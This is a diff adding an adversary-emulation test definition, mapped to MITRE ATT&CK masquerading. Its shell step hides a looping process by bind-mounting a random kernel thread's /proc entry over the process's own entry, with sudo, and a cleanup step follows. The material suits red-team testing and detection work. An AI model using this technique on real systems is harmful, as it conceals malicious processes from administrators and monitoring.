@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Hiding a malicious process with bind mounts
+description: |
+    Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process
+uuid: ad4b73c2-d6e2-4d8b-9868-4c6f55906e01
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1036: Masquerading'
+    subtechniques:
+        - 'T1036.004: Masquerade Task or Service'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: hiding-a-malicious-process-with-bind-mounts
+      inline: |
+        eval '(while true; do :; done) &'
+        echo $! > /tmp/evil_pid.txt
+        random_kernel_pid=$(ps -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1)
+        sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)
+      executor: sh
+      cleanup:
+        inline: |
+            kill $(cat /tmp/evil_pid.txt) || echo "Failed to kill PID $evil_pid"
+            rm /tmp/evil_pid.txt
+        executor: sh
